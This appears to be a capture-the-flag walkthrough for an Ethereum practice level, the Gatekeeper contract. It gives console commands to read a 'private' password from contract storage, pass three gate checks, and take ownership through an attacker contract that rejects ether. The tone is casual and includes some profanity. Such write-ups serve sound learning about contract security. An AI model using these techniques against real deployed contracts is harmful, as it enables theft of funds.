/*
    Hmm, Back with another level man!, really need to control my words today (just in a freaking devil mood..ah so Let's go!)

    This level is really easy if you know about soldity storage, tx.origin stuff and just have a good mind of presence(Yeah, you fucking need it everywhere, just a life advice)

    So, just copy down the code given in 29.Attack.sol and deploy that code with contract's address given in the console

    Now, for getting through the first gate, just real easy, no need to explain
*/

//  For 2nd gate, hmm let's first deploy that simple trick function, go in console and run that createTrick function
await contract.createTrick()

// Now we need to get the password for the SimpleTrick, quite easy tho, just get the address by running the trick function
await contract.trick()

// captivate that address in a variable, like addr and then in the 3rd slot, you gonna get the password
addr = "contract-address"
await web3.eth.getStorageSlot(addr, 3, console.log)

// yea, I know we got some hexadecimal stuff, just convert it to decimals online and yess you got the secret password (haha, an assumption that private gonna keep it really 'secret')

// Now we need to run the getAllowance function and pass our password in it
await contract.getAllowance(password) // make sure password be a uint

// check that you must have that allowEntrance = True


// Now time to move to gate 3
// just transact 0.0011 ether inside that 'Gatekeeper' contract
await contract.sendTransaction({value: 1100000000000000})

// Now using our contract deployed, call the beOwner function first -> this gonna make our contract, the owner
// Then run the attack function which kind of calling the 'enter' function inside our target contract
// All modifier check gonna run, but wait there's still one question be in ur mind, like how we get the second check
// i.e payable(owner).send(0.001 ether) == false passed?

// Actually our contract wasn't having any fallback or receive function to take ether, so that transaction just failed

// Cheers Fam!